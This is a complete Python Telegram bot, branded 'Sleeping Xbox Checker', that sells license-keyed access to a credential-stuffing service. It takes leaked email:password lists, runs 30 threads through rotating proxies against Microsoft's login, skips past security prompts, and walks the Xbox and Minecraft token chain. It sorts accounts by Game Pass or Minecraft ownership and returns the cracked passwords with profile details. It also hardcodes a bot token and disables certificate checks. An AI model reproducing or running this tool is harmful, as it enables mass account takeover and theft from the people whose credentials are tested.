import os
import re
import time
import uuid
import json
import requests
import telebot
import urllib3
import warnings
import concurrent.futures
from telebot import types
from threading import Lock
from urllib.parse import urlparse, parse_qs
from datetime import datetime

# =====================================================================
# --- CHESTER LUA CORE SETTINGS & INITIALIZATION ---
# =====================================================================
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

BOT_TOKEN = "7697030798:AAHiTipLyZu7HCjJnCFu5CEgAHYaqP64ha4"
ADMIN_ID = 8664147577

bot = telebot.TeleBot(BOT_TOKEN)

# Database Files
KEYS_FILE = "keys.json"
USERS_FILE = "users.json"
PROXIES_FILE = "proxies.txt"

# Memory Caches
user_sessions = {}  
active_tasks = {}   
user_hits = {} 
user_2fa = {}       # YENİ: 2FA hesapları önbellekte tutmak için eklendi
user_errors = {}    # YENİ: Hata veren hesapları önbellekte tutmak için eklendi

# Threading & Request Settings (Adjusted for High Performance)
MAX_RETRIES = 3
REQUEST_TIMEOUT = 10
THREAD_COUNT = 30  # Fixed at 30 Threads as requested

# Thread Locks for Safe Data Handling
stats_lock = Lock()
hit_lock = Lock()
proxy_lock = Lock()
msg_lock = Lock()

global_proxy_index = 0

# =====================================================================
# --- FILE MANAGEMENT SYSTEM ---
# =====================================================================
for file in [KEYS_FILE, USERS_FILE]:
    if not os.path.exists(file):
        with open(file, 'w') as f: json.dump({}, f)
if not os.path.exists(PROXIES_FILE):
    with open(PROXIES_FILE, 'w') as f: f.write("")

def load_json(filename):
    with open(filename, 'r') as f: return json.load(f)

def save_json(filename, data):
    with open(filename, 'w') as f: json.dump(data, f, indent=4)

def load_proxies():
    if os.path.exists(PROXIES_FILE):
        with open(PROXIES_FILE, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    return []

def check_user_access(user_id):
    users = load_json(USERS_FILE)
    if str(user_id) == str(ADMIN_ID): return True
    if str(user_id) in users and users[str(user_id)]["expiry"] > time.time(): return True
    return False

# =====================================================================
# --- XBOX CHECKER ENGINE (DIRECTLY FROM YOUR CLI SCRIPT) ---
# =====================================================================
SFTAG_URL = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"

def get_sftag(session, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.get(SFTAG_URL, timeout=REQUEST_TIMEOUT)
            text = response.text
            match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
            if match:
                sftag = match.group(1)
                match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                if match:
                    return match.group(1), sftag
        except Exception as e:
            pass
        time.sleep(0.5)
    return None, None

def microsoft_auth(session, email, password, url_post, sftag, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
            login_request = session.post(url_post, data=data, 
                                        headers={'Content-Type': 'application/x-www-form-urlencoded'}, 
                                        allow_redirects=True, timeout=REQUEST_TIMEOUT)
            
            if '#' in login_request.url and login_request.url != SFTAG_URL:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, "success"
            elif 'cancel?mkt=' in login_request.text:
                try:
                    data = {
                        'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                        'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                        'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                    }
                    action_url = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group()
                    ret = session.post(action_url, data=data, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                    return_url = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group()
                    fin = session.get(return_url, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                    token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                    if token != "None":
                        return token, "success"
                except:
                    pass
            elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                return None, "2fa"
            elif any(value in login_request.text.lower() for value in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account", "tried to sign in too many times"]):
                return None, "bad"  
        except Exception as e:
            if attempt == max_attempts - 1:
                return None, "error"
        time.sleep(0.5)
    return None, "error"

def get_xbox_token(session, ms_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            payload = {
                "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token},
                "RelyingParty": "http://auth.xboxlive.com",
                "TokenType": "JWT"
            }
            response = session.post('https://user.auth.xboxlive.com/user/authenticate', 
                                   json=payload, 
                                   headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                                   timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                data = response.json()
                xbox_token = data.get('Token')
                if xbox_token:
                    uhs = data['DisplayClaims']['xui'][0]['uhs']
                    return xbox_token, uhs
            elif response.status_code == 429:
                time.sleep(2)
                continue
        except Exception as e:
            if attempt == max_attempts - 1:
                return None, None
        time.sleep(0.5)
    return None, None

def get_xsts_token(session, xbox_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            payload = {
                "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]},
                "RelyingParty": "rp://api.minecraftservices.com/",
                "TokenType": "JWT"
            }
            response = session.post('https://xsts.auth.xboxlive.com/xsts/authorize',
                                   json=payload,
                                   headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                                   timeout=REQUEST_TIMEOUT)    
            if response.status_code == 200:
                data = response.json()
                return data.get('Token')
            elif response.status_code == 429:
                time.sleep(2)
                continue
        except Exception as e:
            if attempt == max_attempts - 1:
                return None  
        time.sleep(0.5)    
    return None

def get_minecraft_token(session, uhs, xsts_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.post('https://api.minecraftservices.com/authentication/login_with_xbox',
                                   json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"},
                                   headers={'Content-Type': 'application/json'},
                                   timeout=REQUEST_TIMEOUT)          
            if response.status_code == 200:
                return response.json().get('access_token')
            elif response.status_code == 429:
                time.sleep(2)
                continue
        except Exception as e:
            if attempt == max_attempts - 1:
                return None 
        time.sleep(0.5)
    return None

def check_minecraft_entitlements(session, mc_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.get('https://api.minecraftservices.com/entitlements/mcstore',
                                  headers={'Authorization': f'Bearer {mc_token}'},
                                  timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                text = response.text
                if 'product_game_pass_ultimate' in text: return 'Xbox Game Pass Ultimate', text
                elif 'product_game_pass_pc' in text: return 'Xbox Game Pass', text
                elif '"product_minecraft"' in text: return 'Minecraft', text
                else:
                    others = []
                    if 'product_minecraft_bedrock' in text: others.append("Bedrock")
                    if 'product_legends' in text: others.append("Legends")
                    if 'product_dungeons' in text: others.append('Dungeons')
                    if others: return 'Other: ' + ', '.join(others), text
                    return None, text
            elif response.status_code == 429:
                time.sleep(2)
                continue
            else: return None, None
        except Exception as e:
            if attempt == max_attempts - 1:
                return None, None
        time.sleep(0.5)
    return None, None

def get_minecraft_profile(session, mc_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.get('https://api.minecraftservices.com/minecraft/profile',
                                  headers={'Authorization': f'Bearer {mc_token}'},
                                  timeout=REQUEST_TIMEOUT)
            if response.status_code == 200: return response.json()
            elif response.status_code == 429:
                time.sleep(2)
                continue
            elif response.status_code == 404: return None
        except Exception as e:
            if attempt == max_attempts - 1: return None
        time.sleep(0.5)
    return None

# =====================================================================
# --- TELEGRAM UI & KEYBOARDS (ENGLISH) ---
# =====================================================================
def main_keyboard(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(types.KeyboardButton("🚀 Start Scan"), types.KeyboardButton("👤 My Profile"))
    if str(user_id) == str(ADMIN_ID):
        markup.add(types.KeyboardButton("👑 Admin Panel"))
    return markup

def admin_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🔑 Generate Key", callback_data="adm_gen_key"),
        types.InlineKeyboardButton("📜 List Keys", callback_data="adm_list_keys"),
        types.InlineKeyboardButton("🌐 Manage Proxies", callback_data="adm_proxies")
    )
    return markup

# =====================================================================
# --- BOT COMMANDS & HANDLERS ---
# =====================================================================
@bot.message_handler(commands=['start'])
def start_cmd(message):
    user_id = message.from_user.id
    welcome_text = "💤 **Welcome to Sleeping Xbox Checker Bot!** 💤\n\n"
    if check_user_access(user_id):
        welcome_text += "Your access is active! You can use the menu to start checking.\nType `/stop` to abort an ongoing scan."
        bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=main_keyboard(user_id))
    else:
        welcome_text += "❌ You need a valid license key to use this system.\n\nPlease enter your key using the command:\n`/redeem YOUR-KEY-HERE`"
        bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")

@bot.message_handler(commands=['redeem'])
def redeem_key_cmd(message):
    user_id = message.from_user.id
    parts = message.text.split()
    
    if len(parts) < 2:
        bot.send_message(message.chat.id, "⚠️ **Usage:** `/redeem KEY_CODE`", parse_mode="Markdown")
        return
        
    input_key = parts[1].strip()
    keys = load_json(KEYS_FILE)
    users = load_json(USERS_FILE)

    if input_key in keys and not keys[input_key]["used"]:
        keys[input_key]["used"] = True
        keys[input_key]["used_by"] = user_id
        duration = keys[input_key]["duration"]
        
        current_time = time.time()
        if str(user_id) in users and users[str(user_id)]["expiry"] > current_time:
            users[str(user_id)]["expiry"] += duration
        else:
            users[str(user_id)] = {"expiry": current_time + duration, "username": message.from_user.username}
            
        save_json(KEYS_FILE, keys)
        save_json(USERS_FILE, users)
        
        bot.send_message(message.chat.id, "✅ **Key Successfully Activated!** Your panel is now unlocked.", parse_mode="Markdown", reply_markup=main_keyboard(user_id))
    else:
        bot.send_message(message.chat.id, "❌ Invalid, incorrect, or expired key.")

@bot.message_handler(commands=['stop'])
def stop_checking(message):
    user_id = message.from_user.id
    if user_id in active_tasks and active_tasks[user_id]:
        active_tasks[user_id] = False 
        bot.send_message(message.chat.id, "🛑 **Stopping scan!** Background threads are terminating. Found hits will be compiled and sent shortly...", parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, "⚠️ There is no active scanning process to stop.")

# =====================================================================
# --- PROFILE & ADMIN PANEL IMPLEMENTATION ---
# =====================================================================
@bot.message_handler(func=lambda msg: msg.text == "👤 My Profile")
def profile_handler(message):
    user_id = message.from_user.id
    users = load_json(USERS_FILE)
    
    if str(user_id) == str(ADMIN_ID):
        status = "👑 Creator (Unlimited)"
        expiry_date = "Lifetime"
    elif str(user_id) in users:
        rem_time = users[str(user_id)]["expiry"] - time.time()
        if rem_time > 0:
            status = "💎 VIP User"
            expiry_date = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(users[str(user_id)]["expiry"]))
        else:
            status = "❌ Expired"
            expiry_date = "None"
    else:
        status = "❌ Unlicensed"
        expiry_date = "None"
        
    profile_text = (
        f"👤 **Your Profile Details**\n\n"
        f"🆔 **User ID:** `{user_id}`\n"
        f"🎭 **Status:** `{status}`\n"
        f"⏳ **License Expiry:** `{expiry_date}`"
    )
    bot.send_message(message.chat.id, profile_text, parse_mode="Markdown")

@bot.message_handler(func=lambda msg: msg.text == "👑 Admin Panel")
def admin_panel_trigger(message):
    if str(message.from_user.id) == str(ADMIN_ID):
        bot.send_message(message.chat.id, "🎛️ **Admin Control Center:**", reply_markup=admin_keyboard(), parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("adm_"))
def admin_callback_handler(call):
    if str(call.from_user.id) != str(ADMIN_ID): return
    
    if call.data == "adm_gen_key":
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("1 Day", callback_data="gen_86400"),
            types.InlineKeyboardButton("7 Days", callback_data="gen_604800"),
            types.InlineKeyboardButton("30 Days", callback_data="gen_2592000")
        )
        bot.edit_message_text("🔑 Select the duration for the new key:", call.message.chat.id, call.message.message_id, reply_markup=markup)
        
    elif call.data == "adm_list_keys":
        keys = load_json(KEYS_FILE)
        text = "📜 **Active Unused Keys:**\n\n"
        count = 0
        for k, v in keys.items():
            if not v["used"]:
                dur_days = v["duration"] // 86400
                text += f"`{k}` | ({dur_days} Days)\n"
                count += 1
            if count >= 15: break
        if count == 0: text += "No active unused keys available."
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode="Markdown")
        
    elif call.data == "adm_proxies":
        proxies = load_proxies()
        bot.answer_callback_query(call.id, f"🌐 Total Proxies Loaded: {len(proxies)}", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data.startswith("gen_"))
def process_key_generation(call):
    if str(call.from_user.id) != str(ADMIN_ID): return
    duration = int(call.data.split("_")[1])
    generated_key = f"SLEEPING-" + str(uuid.uuid4()).upper()[:12]
    
    keys = load_json(KEYS_FILE)
    keys[generated_key] = {"duration": duration, "used": False, "used_by": None}
    save_json(KEYS_FILE, keys)
    
    bot.edit_message_text(f"✅ **Key Successfully Generated!**\n\n`{generated_key}`\n\nThe user can activate it using `/redeem {generated_key}`.", call.message.chat.id, call.message.message_id, parse_mode="Markdown")

# =====================================================================
# --- CHECKER FLOW & COMBO PARSING ---
# =====================================================================
@bot.message_handler(func=lambda msg: msg.text == "🚀 Start Scan")
def start_checker_flow(message):
    if not check_user_access(message.from_user.id): return
    if active_tasks.get(message.from_user.id, False):
        bot.send_message(message.chat.id, "⚠️ You already have an ongoing scan. Use `/stop` to abort it first.", parse_mode="Markdown")
        return
        
    markup = types.InlineKeyboardMarkup().add(
        types.InlineKeyboardButton("🌐 Proxied Mode", callback_data="mode_proxy"),
        types.InlineKeyboardButton("📱 Proxyless Mode", callback_data="mode_proxyless")
    )
    bot.send_message(message.chat.id, "🤖 Select connection mode:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("mode_"))
def select_mode_and_request_combos(call):
    user_id = call.from_user.id
    mode = "proxy" if call.data == "mode_proxy" else "proxyless"
    
    if mode == "proxy" and not load_proxies():
        bot.answer_callback_query(call.id, "Proxy list is empty! Admin must load proxies.txt", show_alert=True)
        return
        
    user_sessions[user_id] = {"mode": mode, "step": "waiting_combos"}
    bot.edit_message_text(f"📂 Selected Mode: `{mode.upper()}`\n\nPlease upload your combos as a **.txt file** or paste them directly into the chat:", call.message.chat.id, call.message.message_id, parse_mode="Markdown")

@bot.message_handler(content_types=['document', 'text'])
def handle_combos(message):
    user_id = message.from_user.id
    session = user_sessions.get(user_id)
    
    if isinstance(session, dict) and session.get("step") == "waiting_combos":
        mode = session["mode"]
        combos = []
        
        try:
            if message.document:
                bot.send_message(message.chat.id, "📥 Downloading and parsing combo file...")
                file_info = bot.get_file(message.document.file_id)
                downloaded_file = bot.download_file(file_info.file_path)
                raw_text = downloaded_file.decode('utf-8', errors='ignore')
                combos = [line.strip() for line in raw_text.splitlines() if line.strip() and ":" in line]
            elif message.text:
                combos = [line.strip() for line in message.text.splitlines() if line.strip() and ":" in line]
                
            if not combos:
                bot.send_message(message.chat.id, "❌ No valid `email:password` formats found in the input.")
                return

            user_sessions[user_id] = None
            bot.send_message(message.chat.id, f"🔥 `{len(combos)}` accounts detected.\nStarting high-speed execution with `{THREAD_COUNT}` concurrent threads...\n\n⛔ Type `/stop` anytime to halt execution and retrieve hits.")
            
            user_hits[user_id] = []
            user_2fa[user_id] = []       # YENİ: 2FA Dizisini Başlat
            user_errors[user_id] = []    # YENİ: Error Dizisini Başlat
            active_tasks[user_id] = True
            
            # Start background orchestrator using ThreadPoolExecutor pattern
            from threading import Thread
            t = Thread(target=multithread_manager, args=(user_id, combos, mode, message.chat.id))
            t.start()
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error processing input: {str(e)}")

# =====================================================================
# --- THREAD POOL WORKER & ORCHESTRATOR ---
# =====================================================================
def process_single_combo(user_id, combo, mode, proxies_list, stats, total, chat_id, status_msg):
    global global_proxy_index
    
    if not active_tasks.get(user_id, False):
        return

    try:
        parts = combo.strip().split(':')
        if len(parts) < 2:
            with stats_lock:
                stats["bad"] += 1
                stats["checked"] += 1
            return
            
        email = parts[0]
        password = ':'.join(parts[1:])
        
        session = requests.Session()
        session.verify = False
        
        if mode == "proxy" and proxies_list:
            with proxy_lock:
                p = proxies_list[global_proxy_index % len(proxies_list)]
                global_proxy_index += 1
            session.proxies = {"http": f"http://{p}", "https://{p}": f"http://{p}"}
            
        url_post, sftag = get_sftag(session)
        if not url_post or not sftag:
            with stats_lock:
                stats["errors"] += 1
                stats["checked"] += 1
            with hit_lock:
                if user_id in user_errors: user_errors[user_id].append(f"{email}:{password}")
            return
            
        ms_token, auth_status = microsoft_auth(session, email, password, url_post, sftag)
        
        if auth_status == "2fa":
            with stats_lock: stats["twofa"] += 1
            with hit_lock:
                if user_id in user_2fa: user_2fa[user_id].append(f"{email}:{password}")
        elif auth_status == "bad":
            with stats_lock: stats["bad"] += 1
        elif auth_status != "success" or not ms_token:
            with stats_lock: stats["errors"] += 1
            with hit_lock:
                if user_id in user_errors: user_errors[user_id].append(f"{email}:{password}")
        else:
            xbox_token, uhs = get_xbox_token(session, ms_token)
            if not xbox_token or not uhs:
                with stats_lock: stats["errors"] += 1
                with hit_lock:
                    if user_id in user_errors: user_errors[user_id].append(f"{email}:{password}")
            else:
                xsts_token = get_xsts_token(session, xbox_token)
                if not xsts_token:
                    with stats_lock: stats["errors"] += 1
                    with hit_lock:
                        if user_id in user_errors: user_errors[user_id].append(f"{email}:{password}")
                else:
                    mc_token = get_minecraft_token(session, uhs, xsts_token)
                    if not mc_token:
                        with stats_lock: stats["errors"] += 1
                        with hit_lock:
                            if user_id in user_errors: user_errors[user_id].append(f"{email}:{password}")
                    else:
                        account_type, _ = check_minecraft_entitlements(session, mc_token)
                        if not account_type:
                            with stats_lock: stats["bad"] += 1
                        else:
                            profile = get_minecraft_profile(session, mc_token)
                            if profile:
                                name = profile.get('name', 'N/A')
                                uuid_str = profile.get('id', 'N/A')
                                capes_list = [cape["alias"] for cape in profile.get("capes", [])]
                                capes = ", ".join(capes_list) if capes_list else "None"
                            else:
                                name, uuid_str, capes = "Not Set", "N/A", "N/A"
                                
                            hit_text = (
                                f"Email: {email}\n"
                                f"Password: {password}\n"
                                f"Account Type: {account_type}\n"
                                f"Name: {name}\n"
                                f"UUID: {uuid_str}\n"
                                f"Capes: {capes}\n"
                                f"=========================="
                            )
                            
                            with hit_lock:
                                if user_id in user_hits:
                                    user_hits[user_id].append(hit_text)
                                    
                            with stats_lock:
                                if 'Ultimate' in account_type: stats["xgpu"] += 1
                                elif 'Game Pass' in account_type: stats["xgp"] += 1
                                elif 'Minecraft' in account_type: stats["mc"] += 1
                                else: stats["other"] += 1

        with stats_lock:
            stats["checked"] += 1
            current_checked = stats["checked"]
            
        # Live Interface Updates (Triggered every 15 accounts to prevent rate limiting)
        if current_checked % 15 == 0 or current_checked == total:
            with msg_lock:
                progress_text = (
                    f"💤 **Sleeping Xbox Checker Dashboard** 💤\n\n"
                    f"🚀 **Threads:** `{THREAD_COUNT}` | **Timeout:** `{REQUEST_TIMEOUT}s`\n"
                    f"🔄 **Checked:** `{stats['checked']} / {total}`\n\n"
                    f"👑 **GamePass Ultimate:** `{stats['xgpu']}`\n"
                    f"🎮 **GamePass PC:** `{stats['xgp']}`\n"
                    f"⛏️ **Minecraft:** `{stats['mc']}`\n"
                    f"📦 **Other Hits:** `{stats['other']}`\n\n"
                    f"🔴 **Bad:** `{stats['bad']}` | 🟡 **2FA:** `{stats['twofa']}` | ❌ **Error:** `{stats['errors']}`"
                )
                try:
                    bot.edit_message_text(progress_text, chat_id, status_msg.message_id, parse_mode="Markdown")
                except:
                    pass

    except Exception as e:
        with stats_lock:
            stats["errors"] += 1
            stats["checked"] += 1
        try:
            with hit_lock:
                if user_id in user_errors: user_errors[user_id].append(combo.strip())
        except: pass

def multithread_manager(user_id, combos, mode, chat_id):
    proxies_list = load_proxies()
    status_msg = bot.send_message(chat_id, "📊 **Booting Multithread Pool Matrix...**", parse_mode="Markdown")
    
    stats = {"xgpu": 0, "xgp": 0, "mc": 0, "other": 0, "bad": 0, "twofa": 0, "errors": 0, "checked": 0}
    total = len(combos)
    
    # Implementing the concurrent.futures mapping precisely mapped to CLI script logic
    with concurrent.futures.ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
        futures = []
        for combo in combos:
            if not active_tasks.get(user_id, False):
                break
            futures.append(executor.submit(process_single_combo, user_id, combo, mode, proxies_list, stats, total, chat_id, status_msg))
            
        # Wait for tasks to resolve completely
        for future in concurrent.futures.as_completed(futures):
            pass

    bot.send_message(chat_id, f"🏁 **Task Finished!** (Total Checked: `{stats['checked']}`)", reply_markup=main_keyboard(user_id))
    
    # --- YENİ: HITS, 2FA VE ERRORS ÇIKTI DOSYALARI ---
    
    # 1. HITS Çıktısı
    with hit_lock:
        has_hits = user_id in user_hits and len(user_hits[user_id]) > 0
        hits_count = len(user_hits[user_id]) if has_hits else 0
        
    if has_hits:
        filename = f"Hits_{user_id}_{int(time.time())}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            with hit_lock:
                f.write("\n\n".join(user_hits[user_id]))
        
        with open(filename, "rb") as f:
            bot.send_document(chat_id, f, caption=f"🟢 **Total Verified Hits:** `{hits_count}`")
            
        try: os.remove(filename)
        except: pass
    else:
        bot.send_message(chat_id, "😢 No valid accounts were captured during this session.")
        
    # 2. 2FA Çıktısı (email:password formatında)
    with hit_lock:
        has_2fa = user_id in user_2fa and len(user_2fa[user_id]) > 0
        twofa_count = len(user_2fa[user_id]) if has_2fa else 0
        
    if has_2fa:
        filename_2fa = f"2FA_{user_id}_{int(time.time())}.txt"
        with open(filename_2fa, "w", encoding="utf-8") as f:
            with hit_lock:
                f.write("\n".join(user_2fa[user_id]))
        
        with open(filename_2fa, "rb") as f:
            bot.send_document(chat_id, f, caption=f"🟡 **Total 2FA Accounts:** `{twofa_count}`")
            
        try: os.remove(filename_2fa)
        except: pass

    # 3. ERRORS Çıktısı (email:password formatında)
    with hit_lock:
        has_errors = user_id in user_errors and len(user_errors[user_id]) > 0
        errors_count = len(user_errors[user_id]) if has_errors else 0
        
    if has_errors:
        filename_err = f"Errors_{user_id}_{int(time.time())}.txt"
        with open(filename_err, "w", encoding="utf-8") as f:
            with hit_lock:
                f.write("\n".join(user_errors[user_id]))
        
        with open(filename_err, "rb") as f:
            bot.send_document(chat_id, f, caption=f"❌ **Total Error Accounts:** `{errors_count}`")
            
        try: os.remove(filename_err)
        except: pass
        
    # Temizlik İşlemleri
    if user_id in active_tasks: del active_tasks[user_id]
    if user_id in user_hits: del user_hits[user_id]
    if user_id in user_2fa: del user_2fa[user_id]
    if user_id in user_errors: del user_errors[user_id]

if __name__ == '__main__':
    print("[+] Chester Lua initialized. Bypassing standard restrictions...")
    print("[+] Sleeping Xbox Checker ThreadPool engine is online. Awaiting targets...")
    bot.infinity_polling(timeout=90, long_polling_timeout=90)

